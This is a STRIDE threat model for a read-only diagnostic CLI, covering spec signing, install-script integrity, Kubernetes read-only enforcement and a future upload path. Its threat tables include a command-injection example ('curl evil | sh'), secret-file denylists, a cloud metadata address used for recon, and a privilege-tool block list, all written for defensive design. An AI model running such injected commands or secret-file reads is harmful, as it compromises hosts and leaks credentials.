# 05 Threat model

Owner: security-reviewer. Revision 2, 2026-10-28, after the code-reviewer review
(`reviews/05-threat-model-review-by-code-reviewer.md`). Status: draft for re-review.

This is a STRIDE threat model for `rdy` at M1 scope, with the M2 upload path as requirements. It follows
the accepted ADRs (0001 to 0012) and the install and signing contract in 06. Where I disagree with an
ADR, the finding lives in `reviews/adr-and-00-review-by-security-reviewer.md` (cited as "ADR review
MF-nn or SF-nn"), not here as a second design.

Each mitigation is tagged `[M1]` or `[M2+]` and points to a ticket: `SEC-nn`, a ticket in 06, or
"fold: <name>", which is a row of the fold table under Tickets implied. Likelihood (L) and impact (I) are
H, M or L for a design-partner run in M1. The STRIDE tables are in Appendices A to D. The body is the
requirements, the invariants and the tickets.

## The bounded sentence

In M1, the worst a malicious or buggy signed spec can make `rdy` do is this:

- run built-in read-only checks;
- open connections to the peers in INV-11 (spec endpoints and their redirect hops, spec `ntp_servers`,
  the configured proxy, system resolvers, the selected Kubernetes API server);
- write one report into one new output directory.

It cannot run commands the spec names, write anywhere else, change the cluster, read Kubernetes Secrets
or send result data anywhere. It can make `rdy` reveal spec hostnames to the network through DNS, SNI and
HTTP requests. That is the point of a network check.

Everything that would break this sentence is M2 or later and gets its own review: `custom.exec` (M3,
ADR 0005), file collection and upload (M2), self-update (06).

## Surface 1: the CLI as a privileged process

**Assets.** Host integrity (root). Cluster integrity (cluster-admin kubeconfig). Secrets root can read
(`/etc/shadow`, keys, `/proc/*/environ`, kubeconfig tokens, proxy credentials). The report itself, which
maps the environment. The customer's trust.

```text
 operator shell: root and/or cluster-admin kubeconfig
        |  argv, env, cwd, KUBECONFIG
        v
 +------------------------------- rdy process -------------------------------+
 | spec bytes --[TB1: bounded read, verify]--> parse --> engine --> checks    |
 |                                                         |                  |
 |                          [TB2: mediated Context handles: exec, fs, net,    |
 |                           kube; policy + action log]                       |
 +---------------------------------------------------------|------------------+
     |              |                 |                |              |
  /proc, /sys,   child processes   kube API server   peers in       kubeconfig
  files (read,   (fixed program,   (runtime guard)   INV-11         exec plugin
  denylist)      no shell input)                                    (named exception)
     |
     | [TB3: redaction before write]
     v
  output dir (new, 0700, files 0600) --[TB4: carried out by hand, or upload in M2]--> vendor
```

TB2 is the central control. Checks get four handles on `Context` (ADR review SF-13): `exec`, `fs`
(read-only, under `host_root`, size capped, denylist), `net` (the policy client) and `kube` (the guarded
client). Each enforces its policy and appends to the action log. clippy `disallowed-methods` and
`disallowed-types` keep raw process, socket and file-write APIs out of check code (INV-07).

STRIDE table: Appendix A.

### Kubernetes read-only rule and how it is enforced

The allowlist (matches ADR 0010 and adds SelfSubjectReview, which 03 `k8s.access` and `k8s.rbac` use):

- GET and LIST on the resource set named in `rdy-checks-k8s`, reviewed on every change. ConfigMaps
  metadata-only if ever needed. Never `secrets`, at any path.
- POST only to `selfsubjectaccessreviews`, `selfsubjectrulesreviews` and `selfsubjectreviews`.
- Nothing else. 03's optional `dry_run: true` pod create for `k8s.admission` is rejected in M1. It
  conflicts with ADR 0010 and waits for an ADR 0010 amendment (Decisions needing an ADR).

Enforcement is at runtime. A tower layer added through `kube::client::ClientBuilder` checks method and
path on every request and fails closed: the request never leaves, and the check reports `Error`.
`connect()` returns only the guarded client type and `K8sFamily::new` accepts only that type, so there is
no unguarded client to pass. The mock API server test from ADR 0010 stays as a second line.

### Residual risks

- Root is root. Read-only behaviour, a small dependency set and the action log shrink the trust needed.
  They do not remove it.
- Exec plugins run whatever the operator's kubeconfig says.
- A signed spec can probe internal endpoints it lists. Results stay local unless the customer sends them.
- Windows output files inherit folder ACLs.
- TLS (ADR 0009): `rustls-native-certs` reads only PEM bundles on Linux, so a proxy CA added only to NSS
  or a Java keystore is invisible. webpki rejects certificates with no SAN, and SHA-1 signatures, that
  some old appliances still issue. `net.tls_intercept` reports "rejected by rustls policy" as its own
  result, and docs explain `SSL_CERT_FILE`.
- Reports are customer-attested. A customer can edit one before sending it.

## Surface 2: the spec supply chain

**Assets.** The vendor's minisign secret key. The customer's `trust.yaml`. Spec integrity. The
customer's decision to run.

```text
 vendor (rdy spec sign / stock minisign)        transport (untrusted)          customer host
 +-----------------------------------+   spec + .minisig    email, link,    +---------------------+
 | secret key, encrypted, 0600       | ------------------>  file, USB  ---> | rdy verify / run    |
 +-----------------------------------+         TB5                          | trust.yaml     TB6  |
                 \                                                          +---------------------+
                  \--- public key and fingerprint, out of band (vendor docs, SE) ----^
```

The design is ADR 0002: minisign format, verified with `minisign-verify`, keys pinned per product in
`trust.yaml`, `--key`, `--trust-key` and `rdy trust`. This model adds these requirements on top:

1. **Order.** Read the spec and `.minisig` with bounded reads. Take the key id from the `.minisig` and the
   product from the signed trusted comment. Find a key pinned for that product with that id. Verify the
   raw bytes with `allow_legacy = false`. Only then parse. After parsing, `metadata.product` must equal the
   pinned product and the trusted-comment product. This is compatible with ADR 0002 and gives INV-01.
2. **Weak keys.** Small-order and malformed public keys are refused at `rdy trust add` and `--key`, using
   test vectors run against `minisign-verify`.
3. **Trust store ownership.** A user run reads `$XDG_CONFIG_HOME/rdy/trust.yaml`, then `/etc/rdy/trust.yaml`.
   A root run (euid 0) reads only `/etc/rdy/trust.yaml`, whatever `HOME` or `XDG_CONFIG_HOME` say, because
   macOS `sudo`, `sudo -E` and `su` without `-` keep them. The file and its directory must be root-owned
   and not group or world writable. The file must not be a symlink. On violation: exit 64 with a fix hint
   naming the path and the `chown` and `chmod` to run. Writes are atomic, mode 0644. On Windows the system
   store is `%ProgramData%\rdy\trust.yaml`, and the rule is "writable only by Administrators and SYSTEM".
4. **`--allow-unsigned`** is read from argv only and stamps the reports, as ADR 0002 says. Whether it may
   run a spec whose signature fails, as opposed to one with no signature, is ADR review SF-02.
5. **Domain separation** through a fixed trusted-comment prefix is proposed in ADR review SF-01.

STRIDE table: Appendix B.

### Residual risks

- Key distribution is manual in M1. Pinning the wrong key trusts the wrong vendor.
- No revocation in v1 (ADR 0002). A leaked key stays trusted until removed by hand.
- From M2, the portal is in the trust chain. The bounded sentence is what limits a compromised portal.

## Surface 3: install script and release pipeline

06 owns the mechanics. Its table "Install and signing contract (agreed with 05)" is the security
contract for this surface. **I confirm every row of it**, with one disagreement:

- **Hash check portability.** The verification line `sha256sum --ignore-missing -c SHA256SUMS` is
  GNU-only. busybox (Alpine) lacks `--ignore-missing`, and macOS has `shasum`. A script that falls back to
  "skip" on such a host would install an unchecked binary. Requirement: `install.sh` selects the single
  `SHA256SUMS` line whose file name equals the downloaded archive name exactly, computes the digest with
  `sha256sum`, `shasum -a 256` or `openssl dgst -sha256` (first one present), and compares. If none is
  present, or no line matches, it stops. The docs command may keep `--ignore-missing` with the macOS
  alternative next to it.

Also confirmed: the exact signer identity
`https://github.com/getrdy-io/rdy/.github/workflows/sign-release.yml@refs/tags/v<VERSION>` pinned per
version in `install.sh`; the human regexp in 06 allows `-alpha.N` tags; `scripts/verify-release.sh`
holds the one canonical command. Immutable releases are 06's plan. If the sandbox proof fails, the
fallback control is the signature check, which fails closed on any swapped asset. 06 records the gap.

```text
 maintainer --tag v*--> GitHub (rulesets) --> release (dist) --> sign-release.yml (env "release", approval)
                                                                   | cosign keyless, OIDC
                                                                   v
                        GitHub Release: archives, SBOM, install.sh, SHA256SUMS, SHA256SUMS.sigstore.json
                                                                   ^
 customer: curl ... getrdy.io/install | sh  (M2; M1 uses the pinned release URL) -+
           TB7: script origin                     TB8: artifact origin
```

STRIDE table: Appendix C.

### Residual risks

- curl-pipe-sh trusts getrdy.io for the script itself.
- One maintainer, so no two-person release review.
- cosign is rarely installed. Fail-closed costs first-run convenience. 06 accepted that.
- No Authenticode or notarization in M1, so SmartScreen and some EDR tools will flag `rdy` (SEC-50).

## Surface 4: the upload path (M2)

M1 has no upload code. The full STRIDE table is Appendix D. The requirements M2 must meet:

1. No upload without `--upload` or an interactive yes (default no). A non-TTY run never prompts.
2. Upload reads only files listed in the output dir manifest, which were redacted before write, and
   sends their exact bytes.
3. `upload-receipt.json` records digests, sizes, destination, time and the server's id.
4. The token comes from `RDY_TOKEN`, `--token-file` or a prompt, never argv. It is sent only in
   `Authorization`, has a recognizable prefix (`rdy_st_`), and is write-only, per share link, expiring and
   revocable.
5. The client reads only a receipt id and a URL from the response. It never acts on anything else.
6. The default server is fixed. Any other server is shown in the consent prompt and the receipt.

## Security invariants

Each is a statement that CI tests. "Fold" names the existing ticket that carries the test.

| Id | Invariant | Test |
|---|---|---|
| INV-01 | No spec byte reaches the YAML parser before verification succeeds, except under `--allow-unsigned` or `rdy spec lint`. | Parser spy: a tampered spec is never parsed. |
| INV-02 | Spec (1 MiB), `.minisig` (4 KiB) and `trust.yaml` (256 KiB) are read through `take(limit + 1)`. Oversize exits 64. | Oversize files, a FIFO and `/dev/zero` each exit 64 within 1 s. |
| INV-03 | A spec verifies only if its key id is pinned for the trusted-comment product and `metadata.product` matches. | Unpinned id gives "unknown key"; a key pinned for A fails on B; a comment and metadata mismatch fails. |
| INV-04 | With euid 0, only the system store is read, and it is refused unless root-owned, not group or world writable, and not a symlink. | Run under `sudo` in CI with `HOME` and `XDG_CONFIG_HOME` set to a user dir holding a pin; the pin is ignored. Bad owner, mode and symlink cases exit 64. |
| INV-05 | `--allow-unsigned` is read from argv only. `RDY_ALLOW_UNSIGNED=1` and an `allow_unsigned` config key have no effect. An unsigned run says `signature: unsigned` in JSON and HTML. A signature failure without the flag exits 64. | Integration tests and golden output. |
| INV-06 | Duplicate keys, anchors, aliases, merge keys, multi-document input and unknown top-level keys exit 64. Unknown check ids and unknown per-check fields become `Skipped` ("needs a newer rdy"), run no code, and cap the verdict at Warnings. | Fixtures, including the plan's example with `gpu.cuda` and `aws.iam`. |
| INV-07 | In workspace crates, `std::process::Command`, `tokio::process::Command`, `std::net::TcpStream`, `tokio::net::TcpStream`, `std::fs::write` and `std::fs::File::create` compile only in the facade modules (`clippy.toml` disallowed lists, `#[allow]` only there). Dependency-created sockets come only from the mediated clients. The one named exception is kube exec plugins, recorded in the action log. | `cargo clippy -D warnings` in CI; an action-log completeness test over the fixture run. |
| INV-08 | No shell receives spec-derived input. Unix root runs resolve programs from the fixed PATH. Windows runs use absolute System32 paths. `sudo`, `su`, `doas`, `pkexec` are never executed. | Command runner unit tests; a test that every program name is a source constant. |
| INV-09 | Report files are written only inside one new output dir (Unix 0700 and 0600, `create_new`, no symlink following, temp plus rename). The only other write is `trust.yaml`, on an explicit pin. | Pre-planted symlink, existing file and mode tests; a test that `rdy run` without a pin touches no path outside the output dir. |
| INV-10 | `rdy` exits 70 if uid differs from euid, gid from egid, or (Linux) `CapEff` is nonzero for a non-root uid. Not applicable on Windows. | Unit test with injected ids and a recorded `/proc/self/status`. |
| INV-11 | Network peers are only: spec endpoints and their redirect hops (max 5), spec `ntp_servers`, the configured proxy, system resolvers (queries for spec hostnames only), and the selected API server. The kube exec plugin is the named exception, logged. | Linux CI: the fixture suite runs under `sudo unshare -n` (loopback only, fixture DNS and servers on loopback) inside `strace -f -e trace=connect,sendto,sendmsg`. Every destination must be a loopback fixture address. `sudo` is used because Ubuntu 24.04 runners block unprivileged user namespaces. |
| INV-12 | Every connect, including redirect hops, refuses resolved or literal addresses in 169.254.0.0/16, fe80::/10, fd00:ec2::254 and IPv4-mapped forms. Through a proxy, only the CONNECT hostname can be checked. | Fixture DNS resolving to each address, `::ffff:169.254.169.254`, and a redirect to the metadata IP. |
| INV-13 | Net checks keep status, a fixed list of headers, timing and certificate metadata. They read at most 64 KiB of body and discard it. | A body canary never appears in the output. |
| INV-14 | The kube client sends only allowlisted requests (section above). Anything else fails closed in the tower layer. | The guard rejects a DELETE, a POST to `pods` and a GET on `secrets`; the mock server records only allowed requests across the fixture run. |
| INV-15 | Every string field of the result and every log line passes the redactor first. | Canary secrets in env, proxy URL, kubeconfig and command output never appear in JSON, HTML or stderr at `RUST_LOG=trace`. |
| INV-16 | The HTML report has the ADR 0003 CSP, loads no remote resource, and embeds JSON with `<`, `>` and `&` escaped as `\u003c`, `\u003e` and `\u0026`. | Golden test with script payloads; a headless render with no network requests. |
| INV-17 | Untrusted strings printed to the terminal contain no control characters. | Unit test with ANSI sequences. |
| INV-18 | `unsafe_code = "forbid"` in `[workspace.lints]`. One named FFI module has a `deny` override, every block has a `// SAFETY:` comment, and CI keeps an allowlist of such files. | CI fails on a new file with `unsafe`. |
| INV-19 | `install.sh` behaves as 06's contract table says, plus the hash rule above. | 06's install.sh tamper tests, with wrong-identity, truncation, no-hash-tool and no-matching-line cases. |
| INV-20 | (M2) No upload without the flag or a yes. Exact bytes are sent, and digests match the receipt. | Fake server tests (SEC-41). |

## Dependency policy

The real `deny.toml` lands with 06's "CI lint and deny job" ticket. Rules it must encode:

- crates.io only. No git sources. `Cargo.lock` committed, `--locked` everywhere.
- Bans: `openssl`, `openssl-sys`, `native-tls`, `hyper-tls`, `tokio-native-tls`, `aws-lc-sys` and
  `aws-lc-rs` (ADR 0009), `serde_yaml`, `serde_yml` (RUSTSEC-2025-0068), `libyml` (RUSTSEC-2025-0067),
  `atty` (unmaintained RUSTSEC-2024-0375, unsound RUSTSEC-2021-0145). Wildcards denied, with
  `allow-wildcard-paths = true`.
- Licenses allowed: Apache-2.0, MIT, BSD-2-Clause, BSD-3-Clause, ISC, Zlib, Unicode-3.0, CC0-1.0, BSL-1.0,
  CDLA-Permissive-2.0. MPL-2.0 only as a reviewed per-crate exception. Never GPL, LGPL, AGPL, SSPL, BUSL
  or unknown.
- Advisories: the PR gate uses `unmaintained = "workspace"`. The daily audit uses `"all"` and opens an
  issue instead of blocking. An ignore names a ticket and expires within 90 days.
- A new direct dependency needs security-reviewer approval: purpose, maintainers, `unsafe`, `build.rs`,
  license.

## SECURITY.md

`SECURITY.md` at the repo root covers versions, scope, reporting, timelines and safe harbor.

## Appendix A: Surface 1 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Wrong cluster or identity | `KUBECONFIG` points at prod | M | M | `[M1]` Show context, server and user (from SelfSubjectReview) before the first call and in the report. | SEC-24 |
| S2 | Program hijack | A fake `getenforce` early in root's PATH; a planted `powershell.exe` next to `rdy.exe` | M | H | `[M1]` Unix: as root, programs resolve from `/usr/sbin:/usr/bin:/sbin:/bin`. Windows: absolute `%SystemRoot%\System32` paths. Cleared env plus allowlist (ADR 0004). | fold: command runner |
| T1 | Write outside output dir | A pre-planted symlink in a shared dir; `metadata.product: ../../etc/cron.d/x` | M | H | `[M1]` Slug-validated product. A new dir, `create_new` files, no symlink following, temp plus rename. | SEC-19 |
| T2 | Spec input reaches a shell | Spec value `"/x; curl evil \| sh"` | L | H | `[M1]` Argv only. No shell gets spec-derived input. Windows PowerShell strings are source constants. | fold: command runner |
| T3 | Markup in the HTML report | Proxy cert subject or node name carries `<script>` | M | M | `[M1]` askama autoescape, no `safe`, CSP `default-src 'none'; style-src 'unsafe-inline'; img-src data:` (ADR 0003), embedded JSON escaped as `\u003c`, `\u003e`, `\u0026`. | fold: embed JSON |
| T4 | Terminal escape injection | Banner with ANSI sequences | M | L | `[M1]` Escape control characters in untrusted strings. | fold: error types |
| R1 | "What did it do on my box?" | No record after the run | M | M | `[M1]` Action log in the result. `[M2+]` `rdy run --plan`. | SEC-17, SEC-40 |
| I1 | Secrets in the report | `HTTPS_PROXY=http://svc:pa55@proxy:3128` echoed as evidence; a reqwest error carrying a URL | H | H | `[M1]` Every string field passes the redactor before write. | SEC-25, SEC-26 |
| I2 | Secrets in logs | `RUST_LOG=trace` makes a dependency print a header | M | H | `[M1]` A redacting log layer always. Default caps on hyper, h2, rustls and kube apply only when `RUST_LOG` is unset. | SEC-25 |
| I3 | Report readable by others | Report in `/tmp`, or in `C:\temp`, which inherits the folder ACL | M | M | `[M1]` Unix 0700 and 0600. Windows: default dir under the user profile; ACLs are a residual risk. | SEC-19 |
| I4 | Kubernetes secret material | LIST `secrets`; a full pod LIST returns literal env values | L | H | `[M1]` Guard forbids `secrets`. Pod specs are used in memory for request sums and never stored. | fold: kube guard |
| I5 | Root reads private files | A check walks `/proc/*` and reads `environ` | M | H | `[M1]` `fs` denylist: `/proc/<pid>/environ` and `mem`, `/etc/shadow`, `~/.ssh/*`, private key files. `cmdline` is matched, never stored. | SEC-17 |
| I6 | Phone home | Telemetry or update check | L | H | `[M1]` None exists. strace contact-set test. | SEC-22 |
| I7 | Internal recon or metadata theft via spec | Endpoint or redirect to `169.254.169.254` | M | M | `[M1]` Address policy on every connect, including redirect hops (max 5). No bodies stored. | SEC-21 |
| D1 | Production impact | Bandwidth sample saturates a link; 5 MiB command output | M | M | `[M1]` Per-check timeouts (ADR 0004), capped output, capped bandwidth sample (03). | fold: command runner |
| E1 | Cluster mutation | A bug sends a write with cluster-admin | L | H | `[M1]` Runtime tower guard on the kube client (below). | fold: kube guard |
| E2 | Privilege-carrying install | `rdy` installed setuid, setgid or with file capabilities | L | H | `[M1]` Exit 70 if uid differs from euid, gid from egid, or (Linux) `CapEff` is nonzero for a non-root uid. | fold: Check trait |
| E3 | Self-escalation | `rdy` calls `sudo` | L | H | `[M1]` `sudo`, `su`, `doas`, `pkexec` are refused. Root-only checks report Skipped. | fold: command runner |
| E4 | Memory corruption from crafted input | Crafted spec, command output, HTTP response | L | H | `[M1]` Workspace `unsafe_code = "forbid"`, one named FFI module. `[M2+]` fuzzing. | fold: workspace skeleton, SEC-45 |
| E5 | kubeconfig exec plugin | `aws eks get-token` runs with the user's env | L | H | `[M1]` Named exception (ADR 0010 decision 5). kubeconfig only from `--kubeconfig`, `KUBECONFIG` or the default path. The report names the binary run. | SEC-24 |

## Appendix B: Surface 2 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Impersonated vendor | Attacker signs with their own key and emails "acme-platform" | M | M | `[M1]` Unpinned key id means refuse. Output shows the fingerprint and the local pin note, never a name from the spec. | fold: verify minisign |
| S2 | Planted trust | A local user pins a key that a root run then trusts | M | H | `[M1]` Requirement 3. | fold: trust store |
| S3 | Self-certifying delivery (M2) | Portal serves the spec and its key on one channel | M | H | `[M2+]` Explicit pin on first use; a key change for a pinned product is a hard failure (ADR review SF-03). | SEC-47 |
| T1 | Tampered in transit | `min: 32Gi` edited to `min: 1Gi` | M | M | `[M1]` Verify raw bytes before parsing. | fold: verify minisign |
| T2 | Signature stripping plus a nudge | "Just add `--allow-unsigned`" | M | M | `[M1]` argv only, red banner, `signature: unsigned` in JSON and HTML, hints never suggest the flag. `[M2+]` TTY confirmation (cli-ux). | fold: rdy verify |
| T3 | Parser differential | Duplicate keys or a second YAML document | L | H | `[M1]` One document; duplicate keys, anchors, aliases and merge keys rejected (ADR 0001). | fold: wire serde-saphyr |
| T4 | Rollback | Replay an older signed spec | L | L | `[M1]` Report shows `signed_at` and spec digest. `[M2+]` portal serves latest. | SEC-46 |
| R1 | Dispute over which spec ran | "We never sent that" | L | M | `[M1]` Result records spec sha256, key id and product. | fold: verify minisign |
| I1 | Vendor key leak | Secret key committed or printed | M | H | `[M1]` Encrypted by default, `create_new` 0600, `spec sign` refuses readable key files, secrets never printed. | fold: keygen and sign |
| D1 | Parser exhaustion | Billion laughs, deep nesting, `/dev/zero` as the spec | M | L | `[M1]` Bounded reads, ADR 0001 limits; mostly unreachable once INV-01 holds. | fold: wire serde-saphyr |
| E1 | Capability creep | Unknown check id, exec block | M | H | `[M1]` Unknown check ids and fields become Skipped, and no code runs for them (ADR 0005, 0007). Unknown top-level keys exit 64. No exec in M1. | fold: unknown ids |

## Appendix C: Surface 3 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Typosquat crate or domain | `cargo install rdy-cli` installs a squatter | M | H | `[M1]` Reserve names, including an `rdy-cli` placeholder (ADR review SF-12). | 06 reserve names |
| S2 | Wrong signer identity | A fork's workflow signs a build | M | H | `[M1]` Exact identity and issuer per 06. | 06 sign-release |
| T1 | getrdy.io serves a bad script | Registrar or Cloudflare takeover, DNS hijack | L | H | `[M1]` Hardware key or passkey MFA, registrar lock, DNSSEC, CAA, HSTS. `install.sh` is in `SHA256SUMS`. Verify-first docs. | SEC-05, SEC-31 |
| T2 | Truncated script runs | Connection drops | L | M | `[M1]` `main()` guard (06). | 06 install.sh core |
| T3 | Asset swapped after publish | Stolen token re-uploads | L | H | `[M1]` Signature check; immutable releases if the sandbox proof passes. | 06 sign-release |
| T4 | Compromised Action | Retargeted tag, as with `tj-actions/changed-files` in March 2025 | M | H | `[M1]` SHA pins, zizmor, minimal `permissions`, `id-token: write` only in sign-release. | 06 CI lint, rulesets |
| T5 | Malicious dependency | `build.rs` payload | M | H | `[M1]` Lockfile, `--locked`, crates.io only, cargo-deny, new-dependency review. | 06 CI lint |
| R1 | Unattributable release | "Who published this?" | L | M | `[M1]` Rekor entry, tag rulesets, audit log. | 06 sign-release |
| I1 | Long-lived secrets leak | Token in a CI log | L | M | `[M1]` Keyless signing. `[M2+]` crates.io trusted publishing. | 06 |
| E1 | Installer as root | `sudo sh` | M | M | `[M1]` Refuses uid 0 without `--allow-root`; never sudo (06). | 06 install.sh core |
| E2 | Maintainer takeover | Attacker pushes a tag | L | H | `[M1]` MFA, tag ruleset, manual approval on `release`. | SEC-04, 06 rulesets |

## Appendix D: Surface 4 STRIDE (M2)

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Fake portal | Pasted command adds `--server https://app.getrdy-io.example` | M | H | Fixed default server; any other is shown in the prompt and receipt. | SEC-41 |
| S2 | Stolen token posts fake results | Poisoned vendor dashboard | M | M | Write-only, per link, expiring, revocable, rate limited; results labelled customer-reported. | SEC-42 |
| T1 | Body altered in transit | Intercepting proxy edits it | L | M | TLS; per-file digests verified by the server and echoed in the receipt. | SEC-41 |
| T2 | Server drives the client | Response asks for more data | L | H | Only a receipt id and a URL are read. | SEC-41 |
| R1 | Customer cannot prove what left | Dispute | M | M | Exact on-disk bytes plus the receipt. | SEC-41 |
| I1 | Upload without consent | Default sends data | L | H | Flag or yes only; non-TTY never prompts. | SEC-41 |
| I2 | Unredacted data leaves | File outside the output dir | M | H | Manifest-listed files only, redacted before write. | SEC-41, SEC-44 |
| I3 | Token leaks | argv, shell history, proxy logs | H | M | Env, file or prompt; header only; prefix the redactor catches. | SEC-41, SEC-42 |
| I4 | Cross-tenant leak | One vendor sees another's results | L | H | rdy-cloud's own threat model, before the M2 beta. | none here |
| D1 | Oversized upload | 5 GB bundle, retry storm | L | L | Size caps, bounded retries. | SEC-41 |
| E1 | Token grants more than upload | Reads results | L | H | Write-only scope enforced server side. | SEC-42 |

## Appendix E: what a customer security reviewer will ask

| Question | Answer | When |
|---|---|---|
| What does it do on my host? | Reads `/proc`, `/sys` and named files, runs fixed commands, talks to the INV-11 peers. The action log lists it all. | M1 (`--plan` M2) |
| Does it need root? | No. It reports what it could not check and never asks for sudo. | M1 |
| Does it phone home? | No telemetry and no update check. Tested under strace with no network. | M1 |
| What can a malicious spec do? | The bounded sentence. | M1 |
| What does it do with cluster-admin? | Reads, plus three self-review POSTs, enforced at runtime. Never Secrets. A read-only ClusterRole ships, so you do not need cluster-admin. | M1 |
| How do I verify the binary? | `scripts/verify-release.sh`: cosign keyless bound to `sign-release.yml`, SHA256SUMS, SBOM, `cargo audit bin`. | M1 |
| How do I know the spec is my vendor's? | You pin the vendor's minisign key for that product. Unpinned or tampered specs are refused. | M1 |
| What is in the report? | Field list on the docs security page. 0600 files, redacted before write. | M1 |
| What leaves the machine? | Nothing by default. Upload shows files and destination first and keeps a receipt. | M2 |
| Is it memory safe? | Rust, `unsafe` forbidden outside one documented FFI module, dependencies gated by cargo-deny. | M1 |
| Third-party audit? | Before the Enterprise tier. This threat model is public until then. | M5 |
| How do I report a bug? | SECURITY.md. | M1 |

## Appendix F: redaction corpus requirements (for 04)

- Layout: `tests/fixtures/redaction/<category>/<case>.in`, `.expected` and `.toml` (category, rules that
  must fire, positive or negative). Replacements are typed, for example `[REDACTED:aws_access_key_id]`.
- All values are synthetic. Use vendor-documented examples (`AKIAIOSFODNN7EXAMPLE`). Build values that
  push protection would block at test time, from parts.
- M1 categories: URL userinfo, bearer and basic auth, AWS keys, PEM private keys, kubeconfig credentials,
  `rdy_st_` tokens, secrets by key name in env, YAML, JSON and INI. M2 adds emails, JWTs, common SaaS
  token prefixes, GCP and Azure credentials, and custom spec patterns.
- Hostile cases: JSON-escaped, URL-encoded, quoted, multi-line and ANSI-wrapped values; negatives (git
  SHAs, UUIDs, base64 images, versions); Unicode lookalikes near key names. Chunk-boundary cases at every
  offset are M2, when redaction streams.
- Bars: zero misses on positives fails CI on any miss. False positives are counted, not gated, in M1.
  Every missed-secret report adds a case before the fix. 60 cases in M1, 300 by the end of M2.

## Plan corrections found

- ADR 0010 decision 4 vs 03 `k8s.admission`: ADR 0010 allows no non-GET except review kinds, and 03 adds
  a dry-run pod create. Fix: the M1 guard rejects it. 03 moves `dry_run` to M2 behind an ADR 0010
  amendment.
- ADR 0010 uses `--kube-context`, while 03 and this document use `--context`. Fix: cli-ux decides in 07;
  proposal `--context`.
- ADR 0011 decision 5 publishes no `rdy-cli` package, while 06 reserves names. Fix: reserve a placeholder
  that points to `rdy` (ADR review SF-12).
- ADR 0001 line 15 calls RUSTSEC-2025-0068 "unsound libyml". 0068 is `serde_yml`; 0067 is `libyml`.
- `docs/plan/rdy-plan.md` still names competitors in several tables and the Sources list. The founder's
  rule covers the whole repo. Fix: the plan owner scrubs it.
- The first draft's other corrections (install URL, cosign vs vendor keys, token on argv, curl flags,
  `serde_yaml`, `self_update`, M1 redaction, `custom.exec` milestone, file globs, report link) are now
  settled by ADRs 0001 to 0012, 06 and the ADR review. They are not repeated here.

## Decisions needing an ADR

- Dry-run pod create for `k8s.admission`: amend ADR 0010 or drop the mode. Conservative choice taken for
  M1: rejected.
- Output dir confinement: `cap-std` or `rustix` `openat` plus a Windows path. Conservative choice: `cap-std`.
  Owner: rust-architect.
- Where the M1 redactor lives (an `rdy-engine` module or an early `rdy-bundle`). Owner: rust-architect.
- `--allow-unsigned` for a failing signature (ADR review SF-02; CLAUDE.md rule 3). Conservative: refuse.
- Windows and macOS code signing (paid). Deferred to M3. Owner: release-engineer.

## Tickets implied

M1 standalone: 11 tickets, 27 hours. Folds into existing tickets: 8 hours. M1 security total: 35 hours.

- [M1] SEC-04 Org 2FA, private reporting, CODEOWNERS and a settings check script | owner: security-reviewer | est: 2h | depends on: none | exit test: `scripts/check-org-settings.sh` uses `gh api` to confirm org-wide 2FA, private vulnerability reporting and CODEOWNERS on security paths, and fails when one is off.
- [M1] SEC-05 Harden getrdy.io domain and hosting accounts | owner: release-engineer | est: 2h | depends on: none | exit test: a CI job runs `dig +dnssec`, `dig CAA` and `curl -sI https://getrdy.io` with an HSTS grep, and all pass.
- [M1] SEC-19 Confine writes to a new output dir with safe names | owner: rust-engineer | est: 3h | depends on: Define public spec types in rdy-spec | exit test: product `../x` fails validation, a pre-planted symlink is not followed, an existing file is not overwritten, and Unix modes are 0700 and 0600.
- [M1] SEC-25 Minimal redactor for evidence, errors and logs | owner: rust-engineer | est: 4h | depends on: Define result model and verdict mapping in rdy-spec | exit test: canaries in env, proxy URL, kubeconfig and command output never appear in JSON, HTML or stderr at `RUST_LOG=trace`.
- [M1] SEC-17 Mediated Context handles with action log and read denylist | owner: rust-engineer | est: 3h | depends on: Check trait, Need and Context in rdy-engine; Command runner: fixed argv, scrubbed env, timeout kill, output caps, recorded-output replay | exit test: the fixture run's action log lists every command, file, endpoint and kube request; a read of `/proc/1/environ` is refused; the clippy disallowed lists fail a violating test crate.
- [M1] SEC-21 Egress address policy, capped redirects, no bodies | owner: check-author | est: 3h | depends on: net.egress via proxy and redirect host list | exit test: link-local, metadata and IPv4-mapped targets are refused directly, by DNS and by redirect, a sixth hop is refused, and a body canary never reaches the report.
- [M1] SEC-26 M1 redaction corpus | owner: qa-engineer | est: 3h | depends on: SEC-25 Minimal redactor for evidence, errors and logs | exit test: 60 synthetic cases across the M1 categories, including negatives, pass with zero misses in CI.
- [M1] SEC-22 No-phone-home strace test on Linux CI | owner: qa-engineer | est: 2h | depends on: SEC-21 Egress address policy, capped redirects, no bodies; Loopback network test support (TLS server with generated CA, CONNECT proxy modes, closed port, never-accepting listener, reset after ClientHello) | exit test: under `sudo unshare -n` and strace, every connect and sendto destination in the fixture suite is a loopback fixture address.
- [M1] SEC-24 Read-only ClusterRole example and kube identity display | owner: check-author | est: 2h | depends on: Read-only guard test for rdy-checks-k8s; k8s.rbac (SelfSubjectReview, access reviews, escalate and bind probes) | exit test: M1 k8s checks pass on kind with only `examples/rbac/rdy-readonly.yaml`, and the report shows context, server, user and any exec plugin run (k8s-expert reviews).
- [M1] SEC-31 Docs security page and verify-first install | owner: docs-writer | est: 2h | depends on: First signed alpha, scripts/verify-release.sh and RELEASING.md | exit test: the page lists what rdy reads and contacts, the report fields and link parameters, and CI runs its verify commands against the latest alpha.
- [M1] SEC-32 Security mailbox and security.txt | owner: security-reviewer | est: 1h | depends on: SEC-04 Org 2FA, private reporting, CODEOWNERS and a settings check script | exit test: security@getrdy.io receives a test mail and `https://getrdy.io/.well-known/security.txt` returns both channels.

Folds (extra exit-test clauses on existing tickets, 8h in total):

| Existing ticket | Added clause | +h |
|---|---|---|
| Verify minisign signatures in rdy-spec against a trust store with product binding | Verify before parse, `allow_legacy = false`, weak-key vectors, INV-01 to INV-03 | 1 |
| Trust store load and save in user and system locations | Root-only store and ownership rules, INV-04 | 1 |
| rdy verify command and refuse-unsigned behaviour with --allow-unsigned banner | INV-05 probes; hints never suggest the flag | 0.5 |
